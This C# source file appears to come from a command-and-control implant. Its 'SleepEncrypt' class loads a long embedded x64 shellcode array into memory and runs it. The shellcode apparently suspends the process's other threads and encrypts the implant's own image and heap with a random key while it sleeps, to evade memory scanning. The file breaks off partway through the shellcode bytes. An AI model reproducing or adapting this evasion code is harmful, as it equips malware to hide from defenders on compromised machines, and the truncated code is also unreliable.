using Engineer.Extra;
using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using static Engineer.Extra.h_reprobate.Win32;
using static Engineer.Extra.WinAPIs;
using static Engineer.Functions.SleepEncrypt;

namespace Engineer.Functions
{
    public unsafe class SleepEncrypt
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, FreeType dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        //Load Library kernel32 
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibrary(string library);
        //get proc address kernel32
       
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr libPtr, string function);

        //dll import for VirtualAlloc
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, h_reprobate.Win32.Kernel32.AllocationType flAllocationType, h_reprobate.Win32.Kernel32.MemoryProtection flProtect);

        //dll import for GetCurrentThreadId
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint GetCurrentThreadId();

        [Flags]
        public enum FreeType
        {
            Decommit = 0x4000,
            Release = 0x8000,
        }
        public struct PARAMS
        {
            public IntPtr pBaseAddress;
            public uint dwSleepTime;
            public IntPtr hVirtualProtect;
            public IntPtr hSleep;
            public char Key;
            public uint targetProcessId;
            public uint targetThreadId;
            public IntPtr hOpenThread;
            public IntPtr hSuspendThread;
            public IntPtr hResumeThread;
            public IntPtr hCloseHandle;
            public IntPtr hHeapWalk;
            public IntPtr hGetProcessHeap;
            public IntPtr hCreateToolhelp32Snapshot;
            public IntPtr hThread32First;
            public IntPtr hThread32Next;
            public IntPtr hHeapLock;
            public IntPtr hHeapUnlock;
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int SleepEncryptDelegate(IntPtr pARAMS);


       public static IntPtr hOpenThread { get; set;}
        public static IntPtr hSuspendThread { get; set; }
        public static IntPtr hResumeThread { get; set; }
        public static IntPtr hCloseHandle { get; set; }
        public static IntPtr hHeapWalk { get; set; }
        public static IntPtr hGetProcessHeap { get; set; }
        public static IntPtr hCreateToolhelp32Snapshot { get; set; }
        public static IntPtr hThread32First { get; set; }
        public static IntPtr hThread32Next { get; set; }
        public static IntPtr hVirtualProtect { get; set; }
        public static IntPtr hSleep { get; set; }
        public static IntPtr hHeapLock { get; set; }
        public static IntPtr hHeapUnlock { get; set; }

        public static IntPtr buffer { get; set; } = IntPtr.Zero;


    public static void ExecuteSleep(int sleeptime)
        {
            try
            {
                //if buffer is not IntPtr.Zero then we can just invoke it and not have to re-allocate it
                if (buffer != IntPtr.Zero)
                {
                    //get the base address of the current process
                    IntPtr pBaseAddress = Process.GetCurrentProcess().MainModule.BaseAddress;
                    //set the sleep time
                    uint dwSleepTime = (uint)sleeptime;
                    // get current process id
                    int pid = Process.GetCurrentProcess().Id;
                    //get current thread id
                    uint tid = GetCurrentThreadId();

                    //make a char array of a-z
                    char[] letter_keys = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z' };
                    //pick a random char from the array
                    char random_char = letter_keys[new Random().Next(0, letter_keys.Length)];

                    //get array of the current process's threads ids
                    uint[] threadIds = Process.GetCurrentProcess().Threads.Cast<ProcessThread>().Select(t => (uint)t.Id).ToArray();
                    //remove current thread id from the array
                    threadIds = threadIds.Where(t => t != tid).ToArray();

                    //get a random byte from the keys array

                    PARAMS pARAMS = new PARAMS();
                    pARAMS.dwSleepTime = dwSleepTime;
                    pARAMS.pBaseAddress = pBaseAddress;
                    pARAMS.hSleep = hSleep;
                    pARAMS.hVirtualProtect = hVirtualProtect;
                    pARAMS.Key = random_char;
                    pARAMS.targetProcessId = (uint)pid;
                    pARAMS.targetThreadId = tid;
                    pARAMS.hOpenThread = hOpenThread;
                    pARAMS.hSuspendThread = hSuspendThread;
                    pARAMS.hResumeThread = hResumeThread;
                    pARAMS.hCloseHandle = hCloseHandle;
                    pARAMS.hHeapWalk = hHeapWalk;
                    pARAMS.hGetProcessHeap = hGetProcessHeap;
                    pARAMS.hCreateToolhelp32Snapshot = hCreateToolhelp32Snapshot;
                    pARAMS.hThread32First = hThread32First;
                    pARAMS.hThread32Next = hThread32Next;
                    pARAMS.hHeapLock = hHeapLock;
                    pARAMS.hHeapUnlock = hHeapUnlock;



                    //by making this I can pass the struct into my delegate and send any type of parameters such as arrays while before i could not when using a pointer to the struct directly.
                    int size = Marshal.SizeOf(pARAMS);
                    IntPtr arrPtr = Marshal.AllocHGlobal(size);
                    Marshal.StructureToPtr(pARAMS, arrPtr, false);
                    //Console.WriteLine($"sending random key of {random_char} to the shellcode");
                    SleepEncryptDelegate Run = (SleepEncryptDelegate)Marshal.GetDelegateForFunctionPointer(buffer, typeof(SleepEncryptDelegate));
                    int ReturnValue = Run(arrPtr);
                    //Console.WriteLine(ReturnValue);
                    Marshal.FreeHGlobal(arrPtr);
                }
                else
                {
                    byte[] shellcode_bin ={
                      0x57, 0x48, 0x89, 0xe7, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20,
                      0xe8, 0x0f, 0x04, 0x00, 0x00, 0x48, 0x89, 0xfc, 0x5f, 0xc3, 0x66, 0x2e,
                      0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x54, 0x49, 0x89,
                      0xcc, 0x57, 0x44, 0x89, 0xc7, 0x49, 0x89, 0xc8, 0x56, 0x4c, 0x89, 0xce,
                      0x41, 0x89, 0xd1, 0x53, 0x89, 0xd3, 0x48, 0x89, 0xca, 0x48, 0x83, 0xec,
                      0x38, 0x48, 0x8b, 0x8c, 0x24, 0x80, 0x00, 0x00, 0x00, 0xe8, 0xa6, 0x02,
                      0x00, 0x00, 0x89, 0xda, 0x4c, 0x8d, 0x4c, 0x24, 0x2c, 0x41, 0x89, 0xf8,
                      0xc7, 0x44, 0x24, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xe1, 0xff,
                      0xd6, 0x85, 0xc0, 0x0f, 0x95, 0xc0, 0x48, 0x83, 0xc4, 0x38, 0x5b, 0x0f,
                      0xb6, 0xc0, 0x5e, 0x5f, 0x41, 0x5c, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90,
                      0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xe9, 0x0b, 0x00, 0x00,
                      0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                      0x41, 0x57, 0x41, 0x56, 0x4d, 0x89, 0xce, 0x41, 0x55, 0x4d, 0x89, 0xc5,
                      0x41, 0x54, 0x55, 0x89, 0xcd, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x57, 0x56,
                      0x53, 0x89, 0xd3, 0x31, 0xd2, 0x48, 0x83, 0xec, 0x48, 0x48, 0x8b, 0xbc,
                      0x24, 0xc8, 0x00, 0x00, 0x00, 0xff, 0x94, 0x24, 0xb8, 0x00, 0x00, 0x00,
                      0x48, 0x83, 0xf8, 0xff, 0x74, 0x2b, 0x48, 0x8d, 0x74, 0x24, 0x20, 0xc7,
                      0x44, 0x24, 0x20, 0x1c, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc4, 0x48, 0x89,
                      0xc1, 0x48, 0x89, 0xf2, 0xff, 0x94, 0x24, 0xc0, 0x00, 0x00, 0x00, 0x85,
                      0xc0, 0x75, 0x5d, 0x4c, 0x89, 0xe1, 0xff, 0x94, 0x24, 0xb0, 0x00, 0x00,
                      0x00, 0x48, 0x83, 0xc4, 0x48, 0x5b, 0x5e, 0x5f, 0x5d, 0x41, 0x5c, 0x41,
                      0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3, 0x66, 0x0f, 0x1f, 0x44, 0x00, 0x00,
                      0x31, 0xd2, 0xb9, 0xff, 0x03, 0x1f, 0x00, 0x41, 0xff, 0xd5, 0x49, 0x89,
                      0xc7, 0x48, 0x85, 0xc0, 0x74, 0x16, 0x48, 0x89, 0xc1, 0x41, 0xff, 0xd6,
                      0x4c, 0x89, 0xf9, 0xff, 0x94, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x66, 0x0f,
                      0x1f, 0x44, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x20, 0x1c, 0x00, 0x00, 0x00,
                      0x48, 0x89, 0xf2, 0x4c, 0x89, 0xe1, 0xff, 0xd7, 0x85, 0xc0, 0x74, 0xa3,
                      0x83, 0x7c, 0x24, 0x20, 0x0f, 0x76, 0xe5, 0x44, 0x8b, 0x44, 0x24, 0x28,
                      0x41, 0x39, 0xd8, 0x74, 0xdb, 0x39, 0x6c, 0x24, 0x2c, 0x75, 0xd5, 0xeb,
                      0xab, 0x90, 0x90, 0x90, 0x41, 0x54, 0x89, 0xd2, 0x4c, 0x89, 0xc8, 0x49,
                      0x89, 0xcc, 0x53, 0x48, 0x89, 0xd3, 0x48, 0x83, 0xec, 0x38, 0xc7, 0x44,
                      0x24, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x4c, 0x24, 0x2c, 0xff,
                      0xd0, 0x85, 0xc0, 0x74, 0x18, 0x48, 0x8b, 0x4c, 0x24, 0x70, 0x41, 0x89,
                      0xd9, 0x4d, 0x89, 0xe0, 0x4c, 0x89, 0xe2, 0xe8, 0x58, 0x01, 0x00, 0x00,
                      0xb8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xc4, 0x38, 0x5b, 0x41, 0x5c,
                      0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                      0x55, 0xb8, 0x43, 0x00, 0x00, 0x00, 0x57, 0x56, 0x48, 0x89, 0xce, 0xb9,
                      0x28, 0x00, 0x00, 0x00, 0x53, 0x48, 0x83, 0xec, 0x68, 0x48, 0x8d, 0x6c,
                      0x24, 0x30, 0x66, 0x89, 0x44, 0x24, 0x2e, 0x31, 0xc0, 0x48, 0x89, 0xef,
                      0xf3, 0xaa, 0xff, 0xd2, 0x48, 0x8d, 0x7c, 0x24, 0x2e, 0x48, 0x89, 0xc3,
                      0xeb, 0x0d, 0x66, 0x0f, 0x1f, 0x44, 0x00, 0x00, 0xf6, 0x44, 0x24, 0x3e,
                      0x04, 0x75, 0x19, 0x48, 0x89, 0xea, 0x48, 0x89, 0xd9, 0xff, 0xd6, 0x85,
                      0xc0, 0x75, 0xed, 0x48, 0x83, 0xc4, 0x68, 0x5b, 0x5e, 0x5f, 0x5d, 0xc3,
                      0x0f, 0x1f, 0x40, 0x00, 0x48, 0x8b, 0x54, 0x24, 0x30, 0x44, 0x8b, 0x4c,
                      0x24, 0x38, 0x48, 0x89, 0xf9, 0x49, 0x89, 0xd0, 0xe8, 0x03, 0x00, 0x00,
                      0x00, 0xeb, 0xd0, 0x90, 0x57, 0x31, 0xc0, 0x56, 0x48, 0x89, 0xd6, 0x53,
                      0x48, 0x89, 0xcb, 0x48, 0x81, 0xec, 0x00, 0x01, 0x00, 0x00, 0x48, 0x89,
                      0xe2, 0x0f, 0x1f, 0x00, 0x88, 0x04, 0x02, 0x48, 0x83, 0xc0, 0x01, 0x48,
                      0x3d, 0x00, 0x01, 0x00, 0x00, 0x75, 0xf1, 0x45, 0x31, 0xdb, 0x31, 0xc9,
                      0x0f, 0x1f, 0x40, 0x00, 0x89, 0xc8, 0x44, 0x0f, 0xb6, 0x12, 0x83, 0xc1,
                      0x01, 0x48, 0x83, 0xc2, 0x01, 0x83, 0xe0, 0x07, 0x0f, 0xb6, 0x3c, 0x03,
                      0x44, 0x01, 0xd7, 0x89, 0xf8, 0x44, 0x01, 0xd8, 0x44, 0x0f, 0xb6, 0xd8,
                      0x0f, 0xb6, 0xc0, 0x0f, 0xb6, 0x3c, 0x04, 0x40, 0x88, 0x7a, 0xff, 0x44,
                      0x88, 0x14, 0x04, 0x81, 0xf9, 0x00, 0x01, 0x00, 0x00, 0x75, 0xc9, 0x45,
                      0x85, 0xc9, 0x74, 0x54, 0x44, 0x89, 0xcb, 0x45, 0x31, 0xdb, 0x45, 0x31,
                      0xc9, 0x45, 0x31, 0xd2, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x41, 0x8d, 0x53, 0x01, 0x44, 0x0f, 0xb6, 0xda, 0x0f, 0xb6, 0xd2, 0x0f,
                      0xb6, 0x04, 0x14, 0x42, 0x8d, 0x0c, 0x10, 0x44, 0x0f, 0xb6, 0xd1, 0x0f,
                      0xb6, 0xc9, 0x0f, 0xb6, 0x3c, 0x0c, 0x40, 0x88, 0x3c, 0x14, 0x88, 0x04,
                      0x0c, 0x02, 0x04, 0x14, 0x0f, 0xb6, 0xc0, 0x0f, 0xb6, 0x04, 0x04, 0x42,
                      0x32, 0x04, 0x0e, 0x43, 0x88, 0x04, 0x08, 0x49, 0x83, 0xc1, 0x01, 0x4c,
                      0x39, 0xcb, 0x75, 0xc0, 0x48, 0x81, 0xc4, 0x00, 0x01, 0x00, 0x00, 0x5b,
                      0x5e, 0x5f, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x57, 0x49, 0x89, 0xd2,
                      0x31, 0xc0, 0x56, 0x53, 0x48, 0x81, 0xec, 0x00, 0x01, 0x00, 0x00, 0x48,
                      0x89, 0xe2, 0x66, 0x0f, 0x1f, 0x44, 0x00, 0x00, 0x88, 0x04, 0x02, 0x48,
                      0x83, 0xc0, 0x01, 0x48, 0x3d, 0x00, 0x01, 0x00, 0x00, 0x75, 0xf1, 0x45,
                      0x85, 0xc9, 0x74, 0x52, 0x44, 0x89, 0xce, 0x31, 0xdb, 0x45, 0x31, 0xc9,
                      0x45, 0x31, 0xdb, 0x66, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x8d, 0x53, 0x01, 0x0f, 0xb6, 0xda, 0x0f, 0xb6, 0xd2, 0x0f, 0xb6, 0x04,
                      0x14, 0x42, 0x8d, 0x0c, 0x18, 0x44, 0x0f, 0xb6, 0xd9, 0x0f, 0xb6, 0xc9,
                      0x0f, 0xb6, 0x3c, 0x0c, 0x40, 0x88, 0x3c, 0x14, 0x88, 0x04, 0x0c, 0x02,
                      0x04, 0x14, 0x0f, 0xb6, 0xc0, 0x0f, 0xb6, 0x04, 0x04, 0x43, 0x32, 0x04,
                      0x0a, 0x43, 0x88, 0x04, 0x08, 0x49, 0x83, 0xc1, 0x01, 0x4c, 0x39, 0xce,
                      0x75, 0xc2, 0x48, 0x81, 0xc4, 0x00, 0x01, 0x00, 0x00, 0x5b, 0x5e, 0x5f,
                      0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x49, 0x89, 0xc8, 0x48,
                      0x89, 0xd1, 0x4a, 0x8d, 0x44, 0x02, 0xff, 0x31, 0xd2, 0x48, 0xf7, 0xf1,
                      0x48, 0x0f, 0xaf, 0xc1, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                      0x90, 0x90, 0x90, 0x90, 0x48, 0x85, 0xd2, 0x74, 0x17, 0x48, 0x01, 0xca,
                      0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x30, 0x01, 0x48,
                      0x83, 0xc1, 0x01, 0x48, 0x39, 0xca, 0x75, 0xf4, 0xc3, 0x90, 0x90, 0x90,
                      0x49, 0x89, 0xcb, 0x49, 0x89, 0xd2, 0x4d, 0x85, 0xc9, 0x74, 0x1f, 0x31,
                      0xc9, 0x0f, 0x1f, 0x00, 0x48, 0x89, 0xc8, 0x31, 0xd2, 0x49, 0xf7, 0xf2,
                      0x41, 0x0f, 0xb6, 0x04, 0x13, 0x41, 0x30, 0x04, 0x08, 0x48, 0x83, 0xc1,
                      0x01, 0x49, 0x39, 0xc9, 0x75, 0xe6, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90,
                      0x80, 0x39, 0x00, 0x74, 0x23, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x29, 0xc8,
                      0x0f, 0x1f, 0x40, 0x00, 0x44, 0x8d, 0x04, 0x08, 0x48, 0x83, 0xc1, 0x01,
                      0x80, 0x39, 0x00, 0x75, 0xf3, 0x44, 0x89, 0xc0, 0xc3, 0x0f, 0x1f, 0x80,
                      0x00, 0x00, 0x00, 0x00, 0x45, 0x31, 0xc0, 0x44, 0x89, 0xc0, 0xc3, 0x90,
                      0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x55, 0x57, 0x56, 0x53,
                      0x48, 0x81, 0xec, 0xd8, 0x05, 0x00, 0x00, 0x8b, 0x41, 0x08, 0x48, 0x8b,
                      0x29, 0x4c, 0x8b, 0x61, 0x10, 0x89, 0x84, 0x24, 0xb4, 0x00, 0x00, 0x00,
                      0x8b, 0x41, 0x24, 0x89, 0x44, 0x24, 0x7c, 0x8b, 0x41, 0x28, 0x89, 0x84,
                      0x24, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x0f, 0xbe, 0x41, 0x20, 0x48, 0x89,
                      0x44, 0x24, 0x40, 0x48, 0x8b, 0x41, 0x18, 0x48, 0x89, 0x84, 0x24, 0x80,
                      0x00, 0x00, 0x00, 0x48, 0x8b, 0x41, 0x30, 0x48, 0x89, 0x44, 0x24, 0x48,
                      0x48, 0x8b, 0x41, 0x38, 0x48, 0x89, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00,
                      0x48, 0x8b, 0x41, 0x40, 0x48, 0x89, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00,
                      0x48, 0x8b, 0x41, 0x48, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x8b, 0x41,
                      0x50, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8b, 0x41, 0x58, 0x48, 0x89,
                      0x44, 0x24, 0x60, 0x48, 0x8b, 0x41, 0x60, 0x8b, 0x75, 0x3c, 0x48, 0x89,
                      0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x41, 0x68, 0x48, 0x01,
                      0xee, 0x48, 0x89, 0x84, 0x24, 0xa0, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x41,
                      0x70, 0x66, 0x83, 0x7e, 0x06, 0x00, 0x48, 0x89, 0x84, 0x24, 0xa8, 0x00,
                      0x00, 0x00, 0x48, 0x8b, 0x41, 0x78, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48,
                      0x8b, 0x81, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x70, 0x0f,
                      0xb7, 0x46, 0x14, 0x48, 0x8d, 0x7c, 0x06, 0x18, 0x0f, 0x84, 0xef, 0x00,
                      0x00, 0x00, 0x45, 0x31, 0xf6, 0x48, 0x8d, 0x9c, 0x24, 0xd0, 0x00, 0x00,
                      0x00, 0x0f, 0x1f, 0x00, 0x41, 0x0f, 0xb7, 0xce, 0x8d, 0x04, 0x89, 0xc1,
                      0xe0, 0x03, 0x48, 0x98, 0x48, 0x01, 0xf8, 0x44, 0x8b, 0x50, 0x14, 0x45,
                      0x85, 0xd2, 0x0f, 0x84, 0xb6, 0x00, 0x00, 0x00, 0x44, 0x8b, 0x48, 0x10,
                      0x45, 0x85, 0xc9, 0x0f, 0x84, 0xa9, 0x00, 0x00, 0x00, 0x8b, 0x50, 0x24,
                      0x44, 0x8b, 0x78, 0x0c, 0xc1, 0xea, 0x1c, 0x49, 0x01, 0xef, 0x83, 0xfa,
                      0x06, 0x0f, 0x84, 0xc9, 0x03, 0x00, 0x00, 0x0f, 0x87, 0x93, 0x03, 0x00,
                      0x00, 0x83, 0xfa, 0x02, 0x0f, 0x84, 0xaa, 0x03, 0x00, 0x00, 0x83, 0xfa,
                      0x04, 0x75, 0x15, 0xc7, 0x84, 0x8c, 0xd0, 0x01, 0x00, 0x00, 0x02, 0x00,
                      0x00, 0x00, 0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x44, 0x8b, 0x50, 0x08, 0x49, 0x89, 0xd9, 0x41, 0xb8, 0x04, 0x00, 0x00,
                      0x00, 0x4c, 0x89, 0xf9, 0xc7, 0x84, 0x24, 0xd0, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x00, 0x00, 0x4d, 0x8d, 0xaa, 0xff, 0x0f, 0x00, 0x00, 0x4c, 0x89,
                      0xea, 0x81, 0xe2, 0x00, 0xf0, 0xff, 0xff, 0x41, 0xff, 0xd4, 0x85, 0xc0,
                      0x75, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x81, 0xc4, 0xd8, 0x05,
                      0x00, 0x00, 0x5b, 0x5e, 0x5f, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e,
                      0x41, 0x5f, 0xc3, 0x0f, 0x1f, 0x44, 0x00, 0x00, 0x45, 0x89, 0xe9, 0x48,
                      0x8b, 0x4c, 0x24, 0x40, 0x4d, 0x89, 0xf8, 0x4c, 0x89, 0xfa, 0x41, 0x81,
                      0xe1, 0x00, 0xf0, 0xff, 0xff, 0xe8, 0x16, 0xfd, 0xff, 0xff, 0x41, 0x83,
                      0xc6, 0x01, 0x66, 0x44, 0x39, 0x76, 0x06, 0x0f, 0x87, 0x1f, 0xff, 0xff,
                      0xff, 0x41, 0xb8, 0x04, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x8c, 0x24, 0xcc,
                      0x00, 0x00, 0x00, 0xba, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0xe9, 0xc7,
                      0x84, 0x24, 0xcc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0xff,
                      0xd4, 0x41, 0x89, 0xc0, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x45, 0x85, 0xc0,
                      0x74, 0x8d, 0x31, 0xc0, 0x48, 0x8d, 0x9c, 0x24, 0xd0, 0x00, 0x00, 0x00,
                      0x0f, 0x1f, 0x40, 0x00, 0x88, 0x04, 0x03, 0x48, 0x83, 0xc0, 0x01, 0x48,
                      0x3d, 0x00, 0x01, 0x00, 0x00, 0x75, 0xf1, 0x4c, 0x8d, 0x95, 0x00, 0x10,
                      0x00, 0x00, 0x49, 0x89, 0xe8, 0x45, 0x31, 0xdb, 0x45, 0x31, 0xc9, 0x66,
                      0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x8d, 0x51, 0x01,
                      0x44, 0x0f, 0xb6, 0xca, 0x0f, 0xb6, 0xd2, 0x0f, 0xb6, 0x84, 0x14, 0xd0,
                      0x00, 0x00, 0x00, 0x42, 0x8d, 0x0c, 0x18, 0x44, 0x0f, 0xb6, 0xd9, 0x0f,
                      0xb6, 0xc9, 0x44, 0x0f, 0xb6, 0xac, 0x0c, 0xd0, 0x00, 0x00, 0x00, 0x44,
                      0x88, 0xac, 0x14, 0xd0, 0x00, 0x00, 0x00, 0x88, 0x84, 0x0c, 0xd0, 0x00,
                      0x00, 0x00, 0x02, 0x84, 0x14, 0xd0, 0x00, 0x00, 0x00, 0x0f, 0xb6, 0xc0,
                      0x0f, 0xb6, 0x84, 0x04, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x30, 0x00, 0x49,
                      0x83, 0xc0, 0x01, 0x4d, 0x39, 0xc2, 0x75, 0xac, 0x48, 0x8b, 0x44, 0x24,
                      0x50, 0x4c, 0x8b, 0xbc, 0x24, 0xa8, 0x00, 0x00, 0x00, 0x4c, 0x89, 0x94,
                      0x24, 0xb8, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0xb4, 0x24, 0xa0, 0x00, 0x00,
                      0x00, 0x4c, 0x8b, 0xac, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44,
                      0x24, 0x20, 0x4c, 0x8b, 0x8c, 0x24, 0x88, 0x00, 0x00, 0x00, 0x4c, 0x89,
                      0x7c, 0x24, 0x38, 0x4c, 0x8b, 0x44, 0x24, 0x48, 0x8b, 0x94, 0x24, 0xb0,
                      0x00, 0x00, 0x00, 0x8b, 0x4c, 0x24, 0x7c, 0x4c, 0x89, 0x74, 0x24, 0x30,
                      0x4c, 0x89, 0x6c, 0x24, 0x28, 0xe8, 0x96, 0xf9, 0xff, 0xff, 0x4c, 0x8b,
                      0x4c, 0x24, 0x70, 0x4c, 0x8b, 0x44, 0x24, 0x68, 0x48, 0x8b, 0x54, 0x24,
                      0x60, 0x48, 0x8b, 0x4c, 0x24, 0x58, 0xe8, 0x9d, 0xfa, 0xff, 0xff, 0x4c,
                      0x8b, 0x94, 0x24, 0x80, 0x00, 0x00, 0x00, 0x8b, 0x8c, 0x24, 0xb4, 0x00,
                      0x00, 0x00, 0x41, 0xff, 0xd2, 0x4c, 0x8b, 0x4c, 0x24, 0x70, 0x4c, 0x8b,
                      0x44, 0x24, 0x68, 0x48, 0x8b, 0x54, 0x24, 0x60, 0x48, 0x8b, 0x4c, 0x24,
                      0x58, 0xe8, 0x72, 0xfa, 0xff, 0xff, 0x48, 0x8b, 0x44, 0x24, 0x50, 0x4c,
                      0x89, 0x7c, 0x24, 0x38, 0x4c, 0x89, 0x74, 0x24, 0x30, 0x4c, 0x8b, 0x8c,
                      0x24, 0x90, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x44, 0x24, 0x48, 0x8b, 0x4c,
                      0x24, 0x7c, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x89, 0x6c, 0x24, 0x28,
                      0x8b, 0x94, 0x24, 0xb0, 0x00, 0x00, 0x00, 0xe8, 0x1c, 0xf9, 0xff, 0xff,
                      0x4c, 0x8b, 0x94, 0x24, 0xb8, 0x00, 0x00, 0x00, 0x31, 0xc0, 0x66, 0x90,
                      0x88, 0x04, 0x03, 0x48, 0x83, 0xc0, 0x01, 0x48, 0x3d, 0x00, 0x01, 0x00,
                      0x00, 0x75, 0xf1, 0x48, 0x89, 0xe9, 0x45, 0x31, 0xc9, 0x45, 0x31, 0xc0,
                      0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x8d, 0x50, 0x01,
                      0x44, 0x0f, 0xb6, 0xc2, 0x0f, 0xb6, 0xd2, 0x0f, 0xb6, 0x84, 0x14, 0xd0,
                      0x00, 0x00, 0x00, 0x46, 0x8d, 0x1c, 0x08, 0x45, 0x0f, 0xb6, 0xcb, 0x45,
                      0x0f, 0xb6, 0xdb, 0x46, 0x0f, 0xb6, 0xac, 0x1c, 0xd0, 0x00, 0x00, 0x00,
                      0x44, 0x88, 0xac, 0x14, 0xd0, 0x00, 0x00, 0x00, 0x42, 0x88, 0x84, 0x1c,
                      0xd0, 0x00, 0x00, 0x00, 0x02, 0x84, 0x14, 0xd0, 0x00, 0x00, 0x00, 0x0f,
                      0xb6, 0xc0, 0x0f, 0xb6, 0x84, 0x04, 0xd0, 0x00, 0x00, 0x00, 0x30, 0x01,
                      0x48, 0x83, 0xc1, 0x01, 0x49, 0x39, 0xca, 0x75, 0xab, 0x49, 0x89, 0xd9,
                      0x41, 0xb8, 0x02, 0x00, 0x00, 0x00, 0xba, 0x00, 0x10, 0x00, 0x00, 0x48,
                      0x89, 0xe9, 0xc7, 0x84, 0x24, 0xd0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x41, 0xff, 0xd4, 0x85, 0xc0, 0x0f, 0x84, 0xb0, 0x00, 0x00, 0x00,
                      0x66, 0x83, 0x7e, 0x06, 0x00, 0x0f, 0x84, 0xf9, 0x00, 0x00, 0x00, 0x4c,
                      0x8b, 0x6c, 0x24, 0x40, 0x48, 0x89, 0x6c, 0x24, 0x48, 0x45, 0x31, 0xf6,
                      0x4c, 0x89, 0x64, 0x24, 0x40, 0xeb, 0x14, 0x0f, 0x1f, 0x44, 0x00, 0x00,
                      0x41, 0x83, 0xc6, 0x01, 0x66, 0x44, 0x39, 0x76, 0x06, 0x0f, 0x86, 0xd1,
                      0x00, 0x00, 0x00, 0x41, 0x0f, 0xb7, 0xd6, 0x8d, 0x04, 0x92, 0xc1, 0xe0,
                      0x03, 0x48, 0x98, 0x48, 0x01, 0xf8, 0x44, 0x8b, 0x40, 0x14, 0x45, 0x85,
                      0xc0, 0x74, 0xd9, 0x8b, 0x48, 0x10, 0x85, 0xc9, 0x74, 0xd2, 0x44, 0x8b,
                      0x78, 0x0c, 0x8b, 0x40, 0x08, 0x4c, 0x89, 0xe9, 0x4c, 0x03, 0x7c, 0x24,
                      0x48, 0x8b, 0xac, 0x94, 0xd0, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0xa0, 0xff,
                      0x0f, 0x00, 0x00, 0x4d, 0x89, 0xf8, 0x4c, 0x89, 0xfa, 0x45, 0x89, 0xe1,
                      0x41, 0x81, 0xe1, 0x00, 0xf0, 0xff, 0xff, 0xe8, 0x50, 0xfa, 0xff, 0xff,
                      0x4c, 0x89, 0xe2, 0x48, 0x8b, 0x44, 0x24, 0x40, 0x49, 0x89, 0xd9, 0x81,
                      0xe2, 0x00, 0xf0, 0xff, 0xff, 0x41, 0x89, 0xe8, 0x4c, 0x89, 0xf9, 0xc7,
                      0x84, 0x24, 0xd0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd0,
